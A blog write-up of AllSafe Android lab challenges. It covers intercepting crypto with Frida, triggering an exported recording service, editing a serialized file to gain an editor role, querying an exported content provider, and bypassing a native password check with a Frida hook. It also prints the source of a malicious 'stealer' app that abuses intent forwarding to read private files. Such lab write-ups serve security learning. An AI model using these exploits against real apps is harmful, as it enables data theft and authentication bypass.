---
slug: allsafe-part3
title: AllSafe - Part 3
authors: [wesam]
date: 2026-05-01
tags: [Android]
---

AllSafe Part 3 covers challenges 14–18: Weak Crypto, Insecure Service, Object Serialization, Insecure Provider, and Native Library.

{/* truncate */}

---

## 13. Weak Crypto

![image.png](/img/image30.png)

- Just used this script from frida codeshare
    
```bash
    frida --codeshare fadeevab/intercept-android-apk-crypto-operations -U -f package_name
```
    
- Once a crypto operation is detected, view it with all info we need
    
    ![image.png](/img/image31.png)

<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

## 14. Insecure Service

### **Objective:**

![image.png](/img/image32.png)

#### Solution:

- The app has a recording service, once you click **START SERVICE**, the message `Audio recording started!` appears and audio recording runs in the background for a second, then the recorded audio is stored in `/storage/emulated/0/Download/allsafe_rec_<Date>.mp3`
    
    ![image.png](/img/image33.png)
    
    ![image.png](/img/image34.png)
    
- Decompile the APK and search for `Audio recording started!` — this leads to `RecorderService` class
    
```java
    private File getOutputFile() {
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US);
        String fullPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + "/allsafe_rec_" + dateFormat.format(new Date()) + ".mp3";
        Toast.makeText(getApplicationContext(), "File: " + fullPath, 0).show();
        return new File(fullPath);
    }
```
    
- This code confirms the file path format shown earlier.
- Checking `AndroidManifest.xml` — the service has `android:exported="true"`, so we can trigger it externally via ADB without any user interaction
    
    ![image.png](/img/image35.png)
    
- Since we know the file location, we can start the recording and steal the file.
    
```bash
    a54x:/ # cd /storage/emulated/0/Download
    a54x:/storage/emulated/0/Download # ls
    allsafe_rec_20260407_012729078.mp3  allsafe_rec_20260407_012950865.mp3  ...  flag.txt
    a54x:/storage/emulated/0/Download # cat flag.txt
    76400a3229290e7d6ada977227f9ecc3
```

<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

## 15. Object Serialization

### What is Serialization

![image.png](/img/image36.png)

- A Java object lives in RAM. When the app closes, RAM is wiped —> the object is gone.
- Serialization = **converting a live object into a sequence of bytes so it can be saved to disk or sent over the network.**
- **Deserialization = reading those bytes back and reconstructing the object.**

#### Example:

- Training a model takes hours. After training, you serialize it to `model.pkl`. Next time, you just load it —> no re-training needed.

---

### Challenge

![image.png](/img/image37.png)

### Steps

- Opening the APK in JADX, the challenge logic is inside `onCreateView` in the `ObjectSerialization` fragment. There are two button listeners: `save` and `load`.
    
    ![image.png](/img/image38.png)
    
- The `save` listener creates a `User` object from the UI fields and serializes it to `user.dat` on external storage using Java's built-in `ObjectOutputStream`:
    
```java
    User user = new User(username.getText().toString(), password.getText().toString());
    
    File file = new File(path);
    FileOutputStream fos = new FileOutputStream(file);
    ObjectOutputStream oos = new ObjectOutputStream(fos);
    oos.writeObject(user);  // converts the User object → bytes → writes to file
    
    oos.close();
    fos.close();
```
    
    - `FileOutputStream` — opens the file for writing raw bytes.
    - `ObjectOutputStream` — wraps it and adds the serialization logic: it reads every field in the `User` object and encodes them into a structured byte stream.
    - `writeObject(user)` — triggers the conversion: Java walks through all fields (`username`, `password`, `role`) and writes their values as bytes into `user.dat`.
- Viewing User class, role is hardcoded default value.
    
```java
    public static class User implements Serializable {
        String username;
        String password;
        String role = "ROLE_AUTHOR";  // hardcoded default, always this
    }
```
    
    - The `User` class implements `Serializable` — a marker interface with no methods. It's just a tag that tells the Java runtime "this object is allowed to be serialized". Without it, `writeObject()` throws a `NotSerializableException`
- Lets explain how deserialization is implemented, The `load` listener reads `user.dat` back using `ObjectInputStream` and reconstructs the `User` object from the bytes:
    
```java
    File file = new File();
    FileInputStream fis = new FileInputStream(file);
    ObjectInputStream ois = new ObjectInputStream(fis);
    User user = (User) ois.readObject();  // reads bytes → reconstructs User object
    
    ois.close();
    fis.close();
```
    
    - **`readObject()`** — triggers the reconstruction: Java reads the bytes from `user.dat` and maps them back into a `User` object with all its fields restored exactly as they were when saved — including `role`.
- After reconstruction, the app makes a security decision based on the `role` field from the deserialized object:
    
```java
    if (!user.role.equals("ROLE_EDITOR")) {
        // "Sorry, only editors have access!"
    } else {
        // "Good job!"
    }
```

---

- The problem here is that the app **never verifies** that the file came from itself or that it was not tampered with. It blindly trusts whatever `role` value is inside the bytes.
- Since We know the path is on external storage /`sdcard/Android/data/infosecadventures.allsafe/files/user.dat` , we can access file and modify Role.
    
```java
    final String path = requireActivity().getExternalFilesDir(null) + "/user.dat";
```
    
- To can edit the role, first pull user.dat file into my kali machine `adb pull /sdcard/Android/data/infosecadventures.allsafe/files/user.dat`
- I used sed to edit role to editor `sed -i 's/ROLE_AUTHOR/ROLE_EDITOR/' user.dat`
- Then push user.dat back to device, now we can load data
    
    ![image.png](/img/image39.png)

<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

## 16. Insecure Provider

### Objective

![image.png](/img/image40.png)

### Steps

- Opened `AndroidManifest.xml` in JADX, searched for `<provider>` tags and found two **`DataProvider`** → `exported="true"` , and **`FileProvider`** → `exported="false"`
    
    ![image.png](/img/image41.png)
    
- Opened `DataProvider.java` and examined the two key methods:
    - `onCreate()`:
        
```java
        public boolean onCreate() {
            this.noteDatabaseHelper = new NoteDatabaseHelper(getContext());
            uriMatcher.addURI("infosecadventures.allsafe.dataprovider", "note", 123);
            return false;
        }
```
        
    - `query()`:
        
```java
        public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
            SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
            queryBuilder.setTables("note");
            return queryBuilder.query(this.noteDatabaseHelper.getReadableDatabase(), projection, selection, selectionArgs, null, null, sortOrder);
        }
```
        
    - `uriMatcher` registered in `onCreate()` but **never called in `query()` ,** URI path is completely ignored — any path works, not just `/note`
    - No `checkCallingPermission()` or `enforceReadPermission()`  , Any app or ADB can call this provider freely

<aside>
💡

Content Provider URIs follow this structure:

![image.png](/img/image46.png)

From manifest 

![image.png](/img/image42.png)

</aside>

- We can query this `DataProvider` with adb to get all notes  **`adb shell content query —uri content://infosecadventures.allsafe.dataprovider`**
    
    ![image.png](/img/image44.png)
    
- Because `query()` never checks the URI path, even a garbage path works:
    
    `adb shell content query --uri content://infosecadventures.allsafe.dataprovider/anything`
    
    ![image.png](/img/image44.png)

---

#### 2nd Provider **`FileProvider`**

- As we see this Provider isn't exported,

![image.png](/img/image45.png)

- **`exported="false"`** = no outside app can access the provider **at all.**
- **`grantUriPermissions="true"`** = adds **one exception**: the app can temporarily share a single specific file with another app via an Intent flag.
- **`provider_paths` the whitelist:** Tells `FileProvider`**which folders it's allowed to share files from**. It will refuse to generate a URI for any file outside these folders.

<details>
<summary>**Path Types Reference**</summary>

| Path Type | Points To | Notes |
|-----------|-----------|-------|
| `<files-path>` | `/data/data/com.app/files/` | App's private internal storage |
| `<cache-path>` | `/data/data/com.app/cache/` | Temporary files, can be deleted by Android |
| `<external-path>` | `/sdcard/` | Public shared storage |
| `<external-files-path>` | `/sdcard/Android/data/com.app/files/` | Private folder on SD card, deleted on uninstall |
| `<external-cache-path>` | `/sdcard/Android/data/com.app/cache/` | Temporary files on SD card |
| `<root-path>` | `/` |  Dangerous — entire filesystem |

</details>

- In Our challenge, the **`res/xml/Provider_Paths.xml`**  file
    
```java
    <?xml version="1.0" encoding="utf-8"?>
    <paths>
        <files-path
            name="files"
            path="."/>
    </paths>
```
    
    - `<files-path>` → base is `/data/data/infosecadventures.allsafe/files/`
    - `path="."` → everything inside that folder is allowed
    - `name="files"` → alias used in the generated URI

So a file at:

`/data/data/infosecadventures.allsafe/files/`

Gets shared as:

`content://infosecadventures.allsafe.fileprovider/files/secret.txt` 

---

- To be able to read files from `FileProvider` we have to find another component that **forwards intents without validation**. Search for these patterns in JADX:
1. **Intent forwarding: Any activity that takes an intent from outside and passes it internally** 
    
```java
    startActivity(getIntent().getParcelableExtra("..."))
    startActivityForResult(getIntent().getParcelableExtra("..."), ...)
```
    
2. **URI reading: any activity that receives a URI and opens it** 
    
```java
    getIntent().getData()
    getIntent().getParcelableExtra("...")
    getContentResolver().openInputStream(uri)
```
    
3.  **WebView loading a URI: WebView can render file contents directly — acts as both reader and display.**
    
```java
    webView.loadUrl(uri.toString())
    webView.loadUrl(getIntent().getStringExtra("..."))
```

---

- Here in this challenge I found an exported activity called **`ProxyActivity` that takes an intent as extra**
    
```java
    public class ProxyActivity extends AppCompatActivity {
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
        }
```
    
- In this challenge we can't use ADB as ADB can forward intents via `am start`, but it has two hard limitations here:
    
    | Limitation | Why |
    | --- | --- |
    | Can't set `FLAG_GRANT_READ_URI_PERMISSION` on the inner intent | Without this flag, FileProvider will refuse to serve the file to an outside component |
    | Can't act as a reader | ADB has no activity to receive the file URI and call `openInputStream()` — only code running on the device can do that |
    
    So even if ADB reaches `ProxyActivity`, the file bytes have nowhere to go.
    
- The solution is to write a malicious app with two components:
    1. **A trigger** (`MainActivity`) — crafts the nested intent and fires it:
        
```java
        public void exploit(View view) {
            Intent extra = new Intent();
            extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            extra.setClassName(getPackageName(), "com.example.stealer.steal");
            extra.setData(Uri.parse(
                "content://infosecadventures.allsafe.fileprovider/docs/readme.txt"));
        
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(
                "infosecadventures.allsafe",
                "infosecadventures.allsafe.ProxyActivity"));
            intent.putExtra("extra_intent", extra);
            startActivity(intent);
        }
```
        
    2.  **stealer activity** (`com.example.stealer.steal`) — the reader that receives the file URI and reads its contents:
        
```java
        public class steal extends AppCompatActivity {
            @Override
            protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                setContentView(R.layout.activity_steal);
        
                try {
                    Log.d("LEAK", IOUtil.toString(
                        getContentResolver().openInputStream(getIntent().getData())
                    ));
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        }
```
        
    - `getIntent().getData()` → receives the FileProvider URI forwarded by `ProxyActivity`
    - `getContentResolver().openInputStream()` → opens the file stream
    - `IOUtil.toString()` → reads all bytes to a string

<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

## 17. Native Library

### Objective

![image.png](/img/image47.png)

### Steps

- Opened the APK in JADX and navigated to the `NativeLibrary` fragment.
- Found that the password validation is delegated entirely to a native method
    
```java
    private final native boolean checkPassword(String password);
    static {
        System.loadLibrary("native_library");
    }
```
    
- The click handler logic is straightforward — if `checkPassword()` returns `false`, it shows "Wrong password, try harder!", if `true` → "That's it! Excellent work!", so we have to **make `checkPassword()` return `true`.**
- In order to reverse .so file,  Decompiled the APK using `apktool`: **`apktool d target.apk -o output/` then navigate to `output/lib/arm64-v8a/libnative_library.so`**
- Loaded `libnative_library.so` into Ghidra,  in functions section, found the mangled JNI export name **`:Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword`**
    
    ![image.png](/img/image48.png)
    
- The actual password logic lives inside `checkPass()` — but we don't need to reverse it further. We have the export name, which is enough to hook it directly.

#### Frida script

```javascript
Interceptor.attach(Module.findExportByName(null, "android_dlopen_ext"), {
    onEnter: function(args){
        var path = Memory.readUtf8String(args[0]);
        console.log("[*] " + path);
        nhook(path);
    }
});

function nhook(path){
    if (path.indexOf("libnative_library.so") != -1){
        setTimeout(function(){
            var jni = Module.findExportByName("libnative_library.so",
                "Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword");

            Interceptor.attach(jni, {
                onEnter: function(args){},
                onLeave: function(ret){ ret.replace(1); }
            });
        }, 2000);
    }
}
```

- Used `android_dlopen_ext` — a system-level function called whenever a `.so` is loaded — to detect when our target library is mapped into memory, then attach the hook.
- **Why `android_dlopen_ext`?** — It fires on every `.so` load. We intercept it, check if the loaded path contains our library name, then set up the real hook.
- **Why `setTimeout(..., 2000)`?** — After `dlopen_ext` fires, the library needs a moment to fully initialize in memory before `findExportByName` can resolve its symbols. The delay ensures the module is ready.
- **`ret.replace(1)`** — Replaces the return value of `checkPassword` with `1` (true) regardless of what `checkPass()` actually computed.

**Running the Hook**

**`frida -U -f infosecadventures.allsafe -l hook.js`**